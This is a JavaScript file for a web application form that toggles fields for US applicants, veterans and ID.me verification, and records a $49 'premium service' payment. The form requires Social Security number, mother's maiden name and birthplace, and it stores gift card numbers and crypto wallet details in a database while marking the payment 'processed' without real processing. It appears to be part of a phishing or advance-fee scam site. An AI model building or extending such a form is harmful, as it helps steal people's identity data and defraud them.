document.addEventListener('DOMContentLoaded', function() {
    // Set current year in footer
    document.getElementById('current-year').textContent = new Date().getFullYear();
    
    // Mobile menu toggle
    const mobileMenuBtn = document.querySelector('.mobile-menu');
    const nav = document.querySelector('nav');
    
    if (mobileMenuBtn && nav) {
        mobileMenuBtn.addEventListener('click', function() {
            nav.classList.toggle('active');
            this.querySelector('i').classList.toggle('fa-times');
            this.querySelector('i').classList.toggle('fa-bars');
        });
    }
    
    // Initialize form field toggles
    initializeFormToggles();
});

function initializeFormToggles() {
    // Country change event
    const countrySelect = document.getElementById('country');
    if (countrySelect) {
        countrySelect.addEventListener('change', toggleUSFields);
        toggleUSFields(); // Initialize on load
    }

    // Veteran radio buttons
    const veteranYes = document.getElementById('veteran-yes');
    const veteranNo = document.getElementById('veteran-no');
    const veteranDetails = document.getElementById('veteran-details');
    
    if (veteranYes && veteranNo && veteranDetails) {
        const handleVeteranChange = () => {
            veteranDetails.style.display = veteranYes.checked ? 'block' : 'none';
        };
        
        veteranYes.addEventListener('change', handleVeteranChange);
        veteranNo.addEventListener('change', handleVeteranChange);
        handleVeteranChange(); // Initialize on load
    }

    // ID.me verification radio buttons
    const idmeYes = document.getElementById('idme-yes');
    const idmeNo = document.getElementById('idme-no');
    const idmeVerifiedFields = document.getElementById('idme-verified-fields');
    const idmeNotVerifiedFields = document.getElementById('idme-not-verified-fields');
    
    if (idmeYes && idmeNo && idmeVerifiedFields && idmeNotVerifiedFields) {
        const handleIdmeChange = () => {
            idmeVerifiedFields.style.display = idmeYes.checked ? 'block' : 'none';
            idmeNotVerifiedFields.style.display = idmeNo.checked ? 'block' : 'none';
        };
        
        idmeYes.addEventListener('change', handleIdmeChange);
        idmeNo.addEventListener('change', handleIdmeChange);
        handleIdmeChange(); // Initialize on load
    }

    // Premium service checkbox
    const premiumService = document.getElementById('premium-service');
    const paymentFields = document.getElementById('payment-fields');
    
    if (premiumService && paymentFields) {
        premiumService.addEventListener('change', function() {
            paymentFields.style.display = this.checked ? 'block' : 'none';
        });
    }

    // Payment method change
    const paymentMethod = document.getElementById('payment-method');
    const creditCardFields = document.getElementById('credit-card-fields');
    
    if (paymentMethod && creditCardFields) {
        paymentMethod.addEventListener('change', function() {
            creditCardFields.style.display = this.value === 'credit-card' ? 'block' : 'none';
        });
    }
}

function toggleUSFields() {
    const countrySelect = document.getElementById('country');
    const usFields = document.getElementById('us-fields');
    
    if (!countrySelect || !usFields) return;
    
    if (countrySelect.value === 'US') {
        usFields.style.display = 'block';
        
        // Make US-specific fields required
        const requiredFields = usFields.querySelectorAll('[name="veteran"], [name="idme-verified"], #ssn, #mother-maiden, #birth-place');
        requiredFields.forEach(field => {
            field.required = true;
        });
    } else {
        usFields.style.display = 'none';
        
        // Remove required attribute from US-specific fields
        const requiredFields = usFields.querySelectorAll('[required]');
        requiredFields.forEach(field => {
            field.required = false;
        });
    }
}

// WARNING: Never use this in production - for testing only
document.getElementById('payment-form').addEventListener('submit', async (e) => {
  e.preventDefault();

  const method = document.getElementById('payment-method').value;
  const paymentData = {
    method: method,
    amount: 49,
    status: 'processed',
    application_id: new URLSearchParams(window.location.search).get('application_id') || null
  };

  try {
    switch (method) {
      case 'credit-card':
        const cardNum = document.getElementById('card-number').value.replace(/\s+/g, '');
        paymentData.card_last4 = cardNum.slice(-4);
        paymentData.exp_date = `${document.getElementById('expiry-month').value}/${document.getElementById('expiry-year').value}`;
        break;

      case 'paypal':
        paymentData.paypal_email = document.getElementById('paypal-email').value;
        break;

      case 'gift-card':
        paymentData.gift_card_number = document.getElementById('gift-card-number').value;
        paymentData.gift_card_brand = document.getElementById('gift-card-brand').value;
        break;

      case 'crypto':
        paymentData.crypto_type = document.getElementById('crypto-type').value;
        paymentData.wallet_address = document.getElementById('crypto-wallet-address').value;
        break;

      default:
        alert('Unsupported payment method');
        return;
    }

    await supabase.from('payments').insert([paymentData]);
    alert('Payment recorded (demo only - not secure)');
    window.location.href = 'success.html';
  } catch (error) {
    console.error('Error:', error);
    alert('Failed to record payment: ' + error.message);
  }
});
